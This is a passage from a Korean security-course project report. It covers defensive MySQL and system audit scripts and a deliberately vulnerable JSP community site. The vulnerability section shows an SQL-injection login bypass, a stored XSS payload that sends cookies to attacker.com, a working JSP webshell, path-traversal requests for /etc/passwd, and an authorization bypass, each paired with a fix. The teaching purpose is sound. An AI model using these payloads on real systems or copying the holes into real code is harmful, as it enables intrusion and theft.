        policy_special=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'validate_password_special_char_count';" | awk 'NR==2 {print $2}')

        # 최소 길이 8자 이상, 대소문자/숫자/특수문자 조합 확인
        if [ "$policy_length" -lt 8 ]; then
            result="취약"
            evidence="비밀번호 최소 길이가 ${policy_length}자로 설정됨 (권장: 8자 이상)"
            recommendation="비밀번호 최소 길이 설정: SET GLOBAL validate_password_length = 8;"
        elif [ "$policy_mixed" -lt 1 ] || [ "$policy_number" -lt 1 ] || [ "$policy_special" -lt 1 ]; then
            result="경고"
            evidence="비밀번호 복잡도 정책 미흡 (대소문자: ${policy_mixed}, 숫자: ${policy_number}, 특수문자: ${policy_special})"
            recommendation="복잡도 정책 강화: SET GLOBAL validate_password_mixed_case_count = 1; SET GLOBAL validate_password_number_count = 1; SET GLOBAL validate_password_special_char_count = 1;"
        else
            evidence="비밀번호 정책이 적절히 설정됨 (길이: ${policy_length}, 복잡도: 대소문자/숫자/특수문자 포함)"
            recommendation="현재 상태 유지"
        fi
    fi

    cat <<EOF
    {
      "check_id": "D-02",
      "check_name": "패스워드 복잡도 설정",
      "category": "계정관리",
      "severity": "High",
      "kisa_reference": "KISA D-02",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "${recommendation}",
      "command_used": "SHOW VARIABLES LIKE 'validate_password%';"
    }
EOF
}

check_password_policy
```

#### D-03_privilege_check.sh - 권한 설정 점검

```bash
#!/bin/bash

source /opt/security_check/dbms/config.sh

check_privilege() {
    local result="양호"
    local evidence=""
    local recommendation=""

    # 모든 권한(ALL PRIVILEGES)을 가진 일반 사용자 확인
    excessive_privs=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SELECT User, Host FROM mysql.user WHERE Super_priv='Y' OR Grant_priv='Y';" | grep -v "root" | grep -v "User")

    if [ -n "$excessive_privs" ]; then
        result="취약"
        evidence="불필요한 관리자 권한을 가진 계정 발견: ${excessive_privs}"
        recommendation="최소 권한 원칙 적용: REVOKE SUPER, GRANT OPTION ON *.* FROM 'user'@'host';"
    else
        evidence="관리자 권한이 적절히 제한됨"
        recommendation="현재 상태 유지"
    fi

    # FILE 권한을 가진 사용자 확인
    file_priv_users=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SELECT User, Host FROM mysql.user WHERE File_priv='Y';" | grep -v "root" | grep -v "User")

    if [ -n "$file_priv_users" ]; then
        result="취약"
        evidence="${evidence} / FILE 권한을 가진 일반 계정 발견: ${file_priv_users}"
        recommendation="${recommendation} / FILE 권한 제거: REVOKE FILE ON *.* FROM 'user'@'host';"
    fi

    cat <<EOF
    {
      "check_id": "D-03",
      "check_name": "불필요한 권한 제한",
      "category": "권한관리",
      "severity": "High",
      "kisa_reference": "KISA D-03",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "${recommendation}",
      "command_used": "SELECT User, Host, Super_priv, Grant_priv, File_priv FROM mysql.user;"
    }
EOF
}

check_privilege
```

#### D-04_remote_access.sh - 원격 접속 통제 점검

```bash
#!/bin/bash

source /opt/security_check/dbms/config.sh

check_remote_access() {
    local result="양호"
    local evidence=""
    local recommendation=""

    # '%' 호스트로 접속 가능한 계정 확인
    remote_users=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SELECT User, Host FROM mysql.user WHERE Host='%';" | grep -v "User")

    if [ -n "$remote_users" ]; then
        result="취약"
        evidence="모든 원격 호스트에서 접속 가능한 계정 발견: ${remote_users}"
        recommendation="특정 IP만 허용하도록 설정: RENAME USER 'user'@'%' TO 'user'@'192.168.1.100';"
    else
        evidence="원격 접속이 특정 호스트로 제한됨"
        recommendation="현재 상태 유지"
    fi

    # bind-address 설정 확인
    bind_address=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'bind_address';" | awk 'NR==2 {print $2}')

    if [ "$bind_address" == "0.0.0.0" ] || [ "$bind_address" == "::" ]; then
        result="경고"
        evidence="${evidence} / MySQL이 모든 네트워크 인터페이스에서 연결 수락 중 (bind-address: ${bind_address})"
        recommendation="${recommendation} / 특정 IP로 제한: my.cnf에 bind-address = 127.0.0.1 또는 특정 IP 설정"
    fi

    cat <<EOF
    {
      "check_id": "D-04",
      "check_name": "원격 접속 통제",
      "category": "접근통제",
      "severity": "Critical",
      "kisa_reference": "KISA D-04",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "${recommendation}",
      "command_used": "SELECT User, Host FROM mysql.user; SHOW VARIABLES LIKE 'bind_address';"
    }
EOF
}

check_remote_access
```

#### D-05_audit_log.sh - 로그 설정 점검

```bash
#!/bin/bash

source /opt/security_check/dbms/config.sh

check_audit_log() {
    local result="양호"
    local evidence=""
    local recommendation=""

    # General Log 활성화 여부
    general_log=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'general_log';" | awk 'NR==2 {print $2}')
    general_log_file=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'general_log_file';" | awk 'NR==2 {print $2}')

    # Slow Query Log 활성화 여부
    slow_query_log=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'slow_query_log';" | awk 'NR==2 {print $2}')

    # Error Log 위치
    error_log=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW VARIABLES LIKE 'log_error';" | awk 'NR==2 {print $2}')

    if [ "$general_log" != "ON" ]; then
        result="경고"
        evidence="General Log가 비활성화됨"
        recommendation="General Log 활성화: SET GLOBAL general_log = 'ON';"
    else
        evidence="General Log 활성화됨 (파일: ${general_log_file})"
        recommendation="로그 파일 정기적 백업 및 보관"
    fi

    if [ "$slow_query_log" != "ON" ]; then
        result="경고"
        evidence="${evidence} / Slow Query Log 비활성화됨"
        recommendation="${recommendation} / Slow Query Log 활성화: SET GLOBAL slow_query_log = 'ON';"
    fi

    # 로그 파일 권한 확인
    if [ -f "$general_log_file" ]; then
        log_perm=$(stat -c "%a" "$general_log_file" 2>/dev/null || stat -f "%Lp" "$general_log_file" 2>/dev/null)
        if [ "$log_perm" != "640" ] && [ "$log_perm" != "600" ]; then
            result="취약"
            evidence="${evidence} / 로그 파일 권한 부적절 (현재: ${log_perm}, 권장: 640 또는 600)"
            recommendation="${recommendation} / 로그 파일 권한 조정: chmod 640 ${general_log_file}"
        fi
    fi

    cat <<EOF
    {
      "check_id": "D-05",
      "check_name": "로그 설정",
      "category": "로그관리",
      "severity": "Medium",
      "kisa_reference": "KISA D-05",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "${recommendation}",
      "command_used": "SHOW VARIABLES LIKE 'general_log'; SHOW VARIABLES LIKE 'slow_query_log'; SHOW VARIABLES LIKE 'log_error';"
    }
EOF
}

check_audit_log
```

#### send_report.sh - 진단 결과 전송

```bash
#!/bin/bash

# 사용법: ./send_report.sh <report_file_path>

if [ $# -ne 1 ]; then
    echo "Usage: $0 <report_file_path>"
    exit 1
fi

REPORT_FILE=$1
DIAGNOSIS_SERVER="http://진단서버주소:포트"
API_ENDPOINT="/api/reports/dbms"
API_KEY="진단서버_API_KEY"

# 리포트 파일 존재 여부 확인
if [ ! -f "$REPORT_FILE" ]; then
    echo "Error: Report file not found: $REPORT_FILE"
    exit 1
fi

# curl을 사용하여 JSON 리포트 전송
response=$(curl -s -w "\n%{http_code}" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${API_KEY}" \
    -d @${REPORT_FILE} \
    ${DIAGNOSIS_SERVER}${API_ENDPOINT})

http_code=$(echo "$response" | tail -n1)
response_body=$(echo "$response" | sed '$d')

if [ "$http_code" -eq 200 ] || [ "$http_code" -eq 201 ]; then
    echo "리포트 전송 성공: HTTP ${http_code}"
    echo "서버 응답: ${response_body}"
    logger "DBMS report successfully sent to diagnosis server: ${REPORT_FILE}"
else
    echo "리포트 전송 실패: HTTP ${http_code}"
    echo "서버 응답: ${response_body}"
    logger "Failed to send DBMS report to diagnosis server: ${REPORT_FILE} (HTTP ${http_code})"
    exit 1
fi

exit 0
```

#### Cron 등록 예시

```bash
# /etc/crontab 또는 crontab -e

# 매일 새벽 2시에 DBMS 진단 실행
0 2 * * * /opt/security_check/dbms/scan_dbms.sh

# 매주 월요일 오전 9시에 DBMS 진단 실행
0 9 * * 1 /opt/security_check/dbms/scan_dbms.sh

# 6시간마다 DBMS 진단 실행
0 */6 * * * /opt/security_check/dbms/scan_dbms.sh
```

### 4.5.3 시스템 및 DBMS 진단의 설계 철학

1조는 **원격 셸 실행의 위험성**을 명확히 인지하고, 보안성과 편의성의 균형을 찾는 설계를 채택했습니다.

#### 설계 결정 과정

**방안 1: 원격 셸 실행 (웹 기반 완전 자동화)**
- 장점: 사용자가 웹 인터페이스에서 클릭 한 번으로 진단 가능
- 단점:
  - SSH를 통한 원격 명령 실행은 심각한 보안 취약점
  - 명령 인젝션 공격 위험
  - 대상 서버의 root 권한 필요
  - 악의적 명령 실행 가능성

**방안 2: 로컬 스크립트 + Cron + JSON 전송 (채택)**
- 장점:
  - 원격 명령 실행 없이 안전한 방식
  - 대상 서버에서 자율적으로 진단 실행
  - API를 통한 구조화된 데이터 전송
  - 소스 코드 노출 최소화 (스크립트는 로컬에만 존재)
- 단점:
  - 대상 서버에 스크립트 배포 필요
  - 웹 UI에서 즉시 실행 불가 (Cron 스케줄 따름)

**1조의 최종 선택**: 방안 2 채택

> "원격으로 셸을 실행시킨다는 것 자체가 매우 심각한 취약점이고 매우 위험할 수 있다고 생각해서, 대상 서버에 점검용 셸을 넣어두고 크론으로 주기적으로 실행하게 한 뒤에 JSON 리포트로 진단 서버에 전송해서 DB 저장 및 대시보드에서 확인하는 구조로 설계했습니다." - 팀장 강호혁

#### 강사 피드백: 양날의 검

강사는 1조의 설계 결정에 대해 다음과 같은 통찰력 있는 피드백을 제공했습니다:

"편의성을 높이면 위험해지고, 위험을 낮추려면 불편해질 수밖에 없습니다. 여러 가지 환경이 있는데, 어떤 기관에서는 자기들 서버에 우리가 어떤 프로그램이나 이런 걸 함부로 돌릴 수 있게 허가를 안 내줘요. '원격에서 니네가 장비를 가지고 들어와, 우리가 계정은 제공해줄 수 있어' 이런 식으로 접근하는 데가 있고..."

"또 하나 문제가 이런 식으로 소스를 그쪽에 올려버리면 **소스 공개, 소스 노출**에 또 위험이 있잖아요. 이게 만약에 우리 회사 재산이라고 한다면, 우리 회사에서 기껏 개발한 건데 저쪽에서 돌아갈 수 있게 구현을 해놓고 그쪽에서 돌려버리면, 그게 약간은 임대 형식이 아니라 그 안에서 우리 재산이 돌아가고, 그게 나중에 소거되지 않고 남아있게 되는 경우에 발생할 수 있는 **재산권 침해** 이런 것도 고민을 해야 될 거거든요."

#### 실무 환경에서의 고려사항

| 고려사항 | 원격 실행 방식 | 로컬 실행 + 전송 방식 |
|---------|---------------|----------------------|
| **보안성** | ❌ 낮음 (원격 명령 실행 위험) | ✅ 높음 (로컬 자율 실행) |
| **편의성** | ✅ 높음 (웹 UI 클릭) | ⚠️ 보통 (Cron 스케줄) |
| **고객 수용성** | ⚠️ 보통 (보안 정책에 따라 거부될 수 있음) | ✅ 높음 (대부분 허용) |
| **소스 보호** | ❌ 낮음 (스크립트 노출 + 잔류 위험) | ✅ 높음 (API만 노출) |
| **확장성** | ✅ 높음 (중앙 집중 관리) | ⚠️ 보통 (배포 필요) |
| **실시간성** | ✅ 높음 (즉시 실행) | ⚠️ 보통 (주기적 실행) |

1조는 이러한 트레이드오프를 충분히 고려하여 **보안성**과 **고객 수용성**을 우선시하는 설계를 선택했습니다.

---

## 4.6 취약점 구현 내역

1조는 KISA 주요정보통신기반시설 기술적 취약점 분석·평가 가이드와 OWASP Top 10을 기준으로 다양한 취약점을 의도적으로 구현했습니다.

### 4.6.1 웹 취약점 구현 (18개 항목)

#### 웹 진단 항목 요약

| 번호 | 진단 항목 | OWASP 분류 | 심각도 | 구현 여부 |
|-----|----------|-----------|--------|----------|
| W-01 | SQL Injection | A03:2021 - Injection | Critical | ✅ |
| W-02 | Cross-Site Scripting (XSS) | A03:2021 - Injection | High | ✅ |
| W-03 | Cross-Site Request Forgery (CSRF) | A01:2021 - Broken Access Control | High | ✅ |
| W-04 | File Upload Vulnerability | A04:2021 - Insecure Design | Critical | ✅ |
| W-05 | Path Traversal | A01:2021 - Broken Access Control | High | ✅ |
| W-06 | Command Injection | A03:2021 - Injection | Critical | ✅ |
| W-07 | IDOR (Insecure Direct Object Reference) | A01:2021 - Broken Access Control | Medium | ✅ |
| W-08 | Session Fixation | A07:2021 - Identification and Authentication Failures | High | ✅ |
| W-09 | Cookie without HTTPOnly Flag | A05:2021 - Security Misconfiguration | Medium | ✅ |
| W-10 | Cookie without Secure Flag | A05:2021 - Security Misconfiguration | Medium | ✅ |
| W-11 | Missing Security Headers | A05:2021 - Security Misconfiguration | Low | ✅ |
| W-12 | Information Disclosure | A01:2021 - Broken Access Control | Medium | ✅ |
| W-13 | Weak Password Policy | A07:2021 - Identification and Authentication Failures | Medium | ✅ |
| W-14 | Broken Authentication | A07:2021 - Identification and Authentication Failures | Critical | ✅ |
| W-15 | Authorization Bypass | A01:2021 - Broken Access Control | Critical | ✅ |
| W-16 | Server-Side Template Injection (SSTI) | A03:2021 - Injection | High | ✅ |
| W-17 | XML External Entity (XXE) | A05:2021 - Security Misconfiguration | High | ✅ |
| W-18 | Open Redirect | A01:2021 - Broken Access Control | Medium | ✅ |

#### W-01: SQL Injection 취약점 구현

**취약한 코드 (login.jsp)**

```jsp
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.sql.*" %>
<%
    String username = request.getParameter("username");
    String password = request.getParameter("password");

    // 취약점: 사용자 입력을 직접 SQL 쿼리에 삽입
    String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";

    Connection conn = null;
    Statement stmt = null;
    ResultSet rs = null;

    try {
        Class.forName("com.mysql.cj.jdbc.Driver");
        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/community_db", "root", "password");
        stmt = conn.createStatement();
        rs = stmt.executeQuery(query);

        if (rs.next()) {
            session.setAttribute("user_id", rs.getInt("id"));
            session.setAttribute("username", rs.getString("username"));
            session.setAttribute("role", rs.getString("role"));
            response.sendRedirect("board.jsp");
        } else {
            out.println("<script>alert('로그인 실패'); history.back();</script>");
        }
    } catch (Exception e) {
        e.printStackTrace();
        out.println("Error: " + e.getMessage());
    } finally {
        if (rs != null) rs.close();
        if (stmt != null) stmt.close();
        if (conn != null) conn.close();
    }
%>
```

**공격 시나리오**

```
Username: admin' OR '1'='1'--
Password: anything

실행되는 쿼리:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'anything'

결과: 항상 TRUE가 되어 인증 우회
```

**안전한 코드 (Prepared Statement 사용)**

```java
// Prepared Statement를 사용한 안전한 코드
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

#### W-02: Stored XSS 취약점 구현

**취약한 코드 (board_write.jsp)**

```jsp
<%
    String title = request.getParameter("title");
    String content = request.getParameter("content");

    // 취약점: 사용자 입력을 필터링 없이 DB에 저장
    String query = "INSERT INTO posts (title, content, author_id) VALUES (?, ?, ?)";
    PreparedStatement pstmt = conn.prepareStatement(query);
    pstmt.setString(1, title);
    pstmt.setString(2, content);  // HTML 태그가 그대로 저장됨
    pstmt.setInt(3, userId);
    pstmt.executeUpdate();
%>
```

**취약한 코드 (board_view.jsp)**

```jsp
<%
    // 취약점: DB에서 가져온 데이터를 필터링 없이 출력
    out.println("<h2>" + rs.getString("title") + "</h2>");
    out.println("<div class='content'>" + rs.getString("content") + "</div>");
%>
```

**공격 시나리오**

```html
<!-- 게시글 작성 시 입력 -->
Title: 안녕하세요
Content: <script>
    // 쿠키 탈취
    var img = new Image();
    img.src = 'http://attacker.com/steal?cookie=' + document.cookie;
</script>

<!-- 다른 사용자가 게시글 조회 시 -->
<!-- 스크립트가 실행되어 쿠키가 공격자 서버로 전송됨 -->
```

**안전한 코드 (출력 시 HTML 인코딩)**

```jsp
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@ taglib prefix="fn" uri="http://java.sun.com/jsp/jstl/functions" %>

<!-- JSTL의 c:out 사용 (자동 HTML 인코딩) -->
<h2><c:out value="${post.title}" /></h2>
<div class="content"><c:out value="${post.content}" escapeXml="true" /></div>

<!-- 또는 수동 인코딩 -->
<%
    out.println("<h2>" + StringEscapeUtils.escapeHtml4(rs.getString("title")) + "</h2>");
%>
```

#### W-04: File Upload - 웹쉘 업로드 취약점

**취약한 코드 (file_upload.jsp)**

```jsp
<%@ page import="java.io.*, javax.servlet.*, javax.servlet.http.*" %>
<%@ page import="org.apache.commons.fileupload.*" %>
<%@ page import="org.apache.commons.fileupload.disk.*" %>
<%@ page import="org.apache.commons.fileupload.servlet.*" %>
<%
    String uploadPath = application.getRealPath("/uploads");
    File uploadDir = new File(uploadPath);
    if (!uploadDir.exists()) uploadDir.mkdir();

    DiskFileItemFactory factory = new DiskFileItemFactory();
    ServletFileUpload upload = new ServletFileUpload(factory);

    List<FileItem> items = upload.parseRequest(request);
    for (FileItem item : items) {
        if (!item.isFormField()) {
            String fileName = item.getName();

            // 취약점: 파일 확장자 검증 없음
            File uploadedFile = new File(uploadPath + File.separator + fileName);
            item.write(uploadedFile);

            out.println("파일 업로드 성공: " + fileName);
        }
    }
%>
```

**공격 시나리오**

```jsp
<!-- webshell.jsp (악성 파일) -->
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>

<!-- 공격자가 webshell.jsp를 업로드 후 -->
<!-- http://target.com/uploads/webshell.jsp?cmd=cat /etc/passwd -->
<!-- 시스템 명령 실행 가능 -->
```

**안전한 코드 (화이트리스트 기반 확장자 검증)**

```java
// 허용된 확장자 목록
String[] allowedExtensions = {".jpg", ".jpeg", ".png", ".gif", ".pdf"};
String fileName = item.getName().toLowerCase();

boolean isAllowed = false;
for (String ext : allowedExtensions) {
    if (fileName.endsWith(ext)) {
        isAllowed = true;
        break;
    }
}

if (!isAllowed) {
    out.println("<script>alert('허용되지 않는 파일 형식입니다.'); history.back();</script>");
    return;
}

// 파일명 랜덤화 (확장자 유지)
String ext = fileName.substring(fileName.lastIndexOf("."));
String safeFileName = UUID.randomUUID().toString() + ext;
File uploadedFile = new File(uploadPath + File.separator + safeFileName);
item.write(uploadedFile);

// 업로드 디렉터리 실행 권한 제거
// chmod -x uploads/
```

#### W-05: Path Traversal 취약점

**취약한 코드 (file_download.jsp)**

```jsp
<%
    String fileName = request.getParameter("file");

    // 취약점: 사용자 입력을 검증 없이 파일 경로에 사용
    String filePath = application.getRealPath("/downloads") + File.separator + fileName;
    File file = new File(filePath);

    if (file.exists()) {
        response.setContentType("application/octet-stream");
        response.setHeader("Content-Disposition", "attachment; filename=\"" + fileName + "\"");

        FileInputStream fis = new FileInputStream(file);
        ServletOutputStream sos = response.getOutputStream();

        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) {
            sos.write(buffer, 0, bytesRead);
        }

        fis.close();
        sos.close();
    }
%>
```

**공격 시나리오**

```
http://target.com/file_download.jsp?file=../../../../../../etc/passwd
http://target.com/file_download.jsp?file=../../../../tomcat/conf/server.xml
http://target.com/file_download.jsp?file=../../../database/config.properties

결과: 시스템의 중요 설정 파일 다운로드 가능
```

**안전한 코드 (경로 검증)**

```java
String fileName = request.getParameter("file");

// 경로 구분자 차단
if (fileName.contains("..") || fileName.contains("/") || fileName.contains("\\")) {
    out.println("<script>alert('잘못된 파일명입니다.'); history.back();</script>");
    return;
}

// 화이트리스트 방식: 허용된 파일 목록 확인
String[] allowedFiles = {"document1.pdf", "document2.pdf", "manual.pdf"};
boolean isAllowed = Arrays.asList(allowedFiles).contains(fileName);

if (!isAllowed) {
    out.println("<script>alert('허용되지 않은 파일입니다.'); history.back();</script>");
    return;
}

// 정규화된 경로 사용
String basePath = application.getRealPath("/downloads");
String filePath = new File(basePath, fileName).getCanonicalPath();

// 경로가 basePath 내에 있는지 확인
if (!filePath.startsWith(basePath)) {
    out.println("<script>alert('잘못된 접근입니다.'); history.back();</script>");
    return;
}

File file = new File(filePath);
// ... 파일 다운로드 처리
```

#### W-15: Authorization Bypass - 관리자 페이지 접근 취약점

**취약한 코드 (admin.jsp)**

```jsp
<%
    // 취약점: 클라이언트 측에서 role 값을 조작 가능
    String role = request.getParameter("role");

    if ("admin".equals(role)) {
        // 관리자 기능 제공
%>
        <h1>관리자 페이지</h1>
        <a href="delete_all_posts.jsp">모든 게시글 삭제</a>
        <a href="user_management.jsp">회원 관리</a>
<%
    } else {
        out.println("접근 권한이 없습니다.");
    }
%>
```

**공격 시나리오**

```
# 일반 사용자가 URL 조작
http://target.com/admin.jsp?role=admin

# 또는 쿠키 조작
document.cookie = "role=admin";

# 결과: 인증 우회하여 관리자 기능 접근
```

**안전한 코드 (세션 기반 권한 검증)**

```java
<%
    // 세션에서 role 값 확인 (서버 측에서만 관리)
    String role = (String) session.getAttribute("role");

    if (role == null || !role.equals("admin")) {
        response.sendRedirect("error.jsp?msg=권한이 없습니다.");
        return;
    }

    // 관리자 기능 제공
%>
```

### 4.6.2 시스템 취약점 구현 (67개 항목)

KISA 주요정보통신기반시설 기술적 취약점 분석·평가 가이드의 **시스템 분야 67개 항목**을 기준으로 진단 스크립트를 작성했습니다.

#### 시스템 진단 카테고리별 분류

| 카테고리 | 항목 수 | 주요 점검 항목 |
|---------|--------|---------------|
| 계정관리 | 13 | 기본 계정 존재, 패스워드 정책, 계정 잠금 임계값, sudo 권한 |
| 파일 및 디렉터리 관리 | 14 | 파일 소유권, SUID/SGID 파일, world-writable 파일, umask 설정 |
| 서비스 관리 | 12 | 불필요한 서비스, 포트 리스닝, xinetd 설정, NFS 공유 |
| 패치 관리 | 8 | 커널 버전, 패키지 업데이트, 보안 패치 적용 |
| 로그 관리 | 10 | syslog 설정, 로그 파일 권한, 로그 보존 정책 |
| 보안 설정 | 10 | 방화벽 설정, SELinux/AppArmor, TCP Wrapper, 시스템 배너 |

#### 대표 취약점 예시

**S-03: SUID/SGID 파일 점검**

```bash
#!/bin/bash

check_suid_sgid() {
    local result="양호"
    local evidence=""

    # SUID 파일 검색
    suid_files=$(find / -type f -perm -4000 2>/dev/null | head -20)

    # SGID 파일 검색
    sgid_files=$(find / -type f -perm -2000 2>/dev/null | head -20)

    # 위험한 SUID 파일 확인
    dangerous_suid=("nmap" "vim" "find" "python" "perl" "ruby" "gcc")

    for file in $suid_files; do
        basename=$(basename $file)
        for dangerous in "${dangerous_suid[@]}"; do
            if [ "$basename" == "$dangerous" ]; then
                result="취약"
                evidence="${evidence}위험한 SUID 파일 발견: $file\n"
            fi
        done
    done

    if [ "$result" == "양호" ]; then
        evidence="위험한 SUID/SGID 파일이 발견되지 않음"
    fi

    cat <<EOF
    {
      "check_id": "S-03",
      "check_name": "SUID/SGID 설정 파일 점검",
      "category": "파일 및 디렉터리 관리",
      "severity": "High",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "불필요한 SUID/SGID 권한 제거: chmod u-s <파일명>; chmod g-s <파일명>",
      "suid_count": $(echo "$suid_files" | wc -l),
      "sgid_count": $(echo "$sgid_files" | wc -l)
    }
EOF
}

check_suid_sgid
```

**S-15: SSH 설정 점검**

```bash
#!/bin/bash

check_ssh_config() {
    local result="양호"
    local evidence=""
    local issues=0

    SSH_CONFIG="/etc/ssh/sshd_config"

    # Root 로그인 허용 여부
    root_login=$(grep "^PermitRootLogin" $SSH_CONFIG | awk '{print $2}')
    if [ "$root_login" != "no" ]; then
        result="취약"
        evidence="${evidence}Root 로그인 허용됨\n"
        ((issues++))
    fi

    # 패스워드 인증 허용 여부
    password_auth=$(grep "^PasswordAuthentication" $SSH_CONFIG | awk '{print $2}')
    if [ "$password_auth" != "no" ]; then
        result="경고"
        evidence="${evidence}패스워드 인증 허용됨 (키 기반 인증 권장)\n"
        ((issues++))
    fi

    # 빈 패스워드 허용 여부
    empty_password=$(grep "^PermitEmptyPasswords" $SSH_CONFIG | awk '{print $2}')
    if [ "$empty_password" == "yes" ]; then
        result="취약"
        evidence="${evidence}빈 패스워드 허용됨\n"
        ((issues++))
    fi

    # SSH 프로토콜 버전
    protocol=$(grep "^Protocol" $SSH_CONFIG | awk '{print $2}')
    if [ "$protocol" != "2" ]; then
        result="취약"
        evidence="${evidence}SSH Protocol 1 사용 중 (취약)\n"
        ((issues++))
    fi

    if [ $issues -eq 0 ]; then
        evidence="SSH 설정이 안전하게 구성됨"
    fi

    cat <<EOF
    {
      "check_id": "S-15",
      "check_name": "SSH 보안 설정",
      "category": "서비스 관리",
      "severity": "High",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "sshd_config에서 PermitRootLogin no, PasswordAuthentication no, Protocol 2 설정",
      "config_file": "${SSH_CONFIG}",
      "issues_found": $issues
    }
EOF
}

check_ssh_config
```

### 4.6.3 DBMS 취약점 구현 (26개 항목)

KISA 가이드의 **DBMS 분야 26개 항목**을 MySQL/MariaDB 환경에서 구현했습니다.

#### DBMS 진단 항목 요약

| 번호 | 진단 항목 | 심각도 | 설명 |
|-----|----------|--------|------|
| D-01 | 불필요한 계정 존재 여부 | High | test, guest, demo 등 기본 계정 확인 |
| D-02 | 패스워드 복잡도 설정 | High | validate_password 플러그인 활성화 여부 |
| D-03 | 불필요한 권한 제한 | High | Super_priv, Grant_priv, File_priv 확인 |
| D-04 | 원격 접속 통제 | Critical | '%' 호스트 허용 여부, bind-address 설정 |
| D-05 | 로그 설정 | Medium | general_log, slow_query_log, error_log 활성화 |
| D-06 | 데이터 암호화 | High | SSL/TLS 연결, 저장 데이터 암호화 |
| D-07 | 백업 설정 | Medium | 정기 백업 수행 여부, 백업 파일 권한 |
| D-08 | 버전 및 패치 | High | MySQL 버전, 알려진 취약점 패치 여부 |
| D-09 | 파일 권한 | Medium | my.cnf, 데이터 디렉터리 권한 확인 |
| ... | ... | ... | ... |

**D-10: SQL Injection 방어 설정**

```bash
#!/bin/bash

check_sql_injection_defense() {
    local result="양호"
    local evidence=""

    # sql_mode 확인
    sql_mode=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SELECT @@sql_mode;" | tail -1)

    # STRICT 모드 확인
    if [[ ! "$sql_mode" =~ "STRICT_TRANS_TABLES" ]]; then
        result="경고"
        evidence="STRICT_TRANS_TABLES 모드가 비활성화됨"
    fi

    # NO_BACKSLASH_ESCAPES 확인 (활성화되면 위험)
    if [[ "$sql_mode" =~ "NO_BACKSLASH_ESCAPES" ]]; then
        result="취약"
        evidence="${evidence} / NO_BACKSLASH_ESCAPES 모드 활성화됨 (SQL Injection 위험)"
    fi

    # Prepared Statement 사용 권장
    ps_usage=$(mysql -u ${DB_ADMIN_USER} -p${DB_ADMIN_PASSWORD} -e "SHOW STATUS LIKE 'Prepared_stmt_count';" | awk 'NR==2 {print $2}')

    if [ "$ps_usage" -eq 0 ]; then
        result="경고"
        evidence="${evidence} / Prepared Statement 사용되지 않음 (권장사항)"
    fi

    cat <<EOF
    {
      "check_id": "D-10",
      "check_name": "SQL Injection 방어 설정",
      "category": "보안 설정",
      "severity": "High",
      "result": "${result}",
      "evidence": "${evidence}",
      "recommendation": "애플리케이션에서 Prepared Statement 사용, STRICT 모드 활성화",
      "sql_mode": "${sql_mode}"
    }
EOF
}

check_sql_injection_defense
```

---

## 4.7 프로젝트 시연

1조는 **커뮤니티 사이트**와 **진단 사이트** 두 개의 웹 애플리케이션을 시연했습니다.

### 4.7.1 보안 소셜 커뮤니티 플랫폼

#### 주요 기능

**1. 로그인 및 회원가입**
- URL: `http://community.team1.local/login.jsp`
- 취약점: SQL Injection을 통한 인증 우회
- 데모 계정:
  - 일반 사용자: `user1 / password123`
  - 관리자: `admin / admin1234`

**2. 게시판 기능**
- 글쓰기: 제목, 내용, 파일 첨부 가능
- 취약점: Stored XSS, 파일 업로드 취약점
- 댓글 기능: 상호작용 가능

**3. 마이 페이지**
- 회원 정보 수정
- 회원 탈퇴
- 내가 쓴 글/댓글 조회
- 취약점: IDOR (다른 사용자 정보 조회 가능)

**4. 인기 글**
- 조회수 기반 인기 글 표시
- 취약점: 조회수 조작 가능

**5. 관리자 페이지**
- URL: `http://community.team1.local/admin/`
- 공지사항 작성
- 모든 게시글 수정/삭제
- 회원 관리
- 취약점: Authorization Bypass (URL 직접 접근)

### 4.7.2 진단 시스템 대시보드

#### 메인 대시보드

**진단 서버 URL**: `http://diagnosis.team1.local`

**로그인 후 표시되는 3가지 대시보드**:

1. **웹 취약점 대시보드**
   - 18개 웹 진단 항목 현황
   - 심각도별 분류 (Critical, High, Medium, Low)
   - 최근 진단 이력
   - 필터링 기능: 사이트별, 날짜별, 심각도별

2. **시스템 취약점 대시보드**
   - 67개 시스템 진단 항목 현황
   - 카테고리별 분류 (계정관리, 파일관리, 서비스관리 등)
   - 취약점 추이 그래프

3. **DBMS 취약점 대시보드**
   - 26개 DBMS 진단 항목 현황
   - DB별 진단 결과
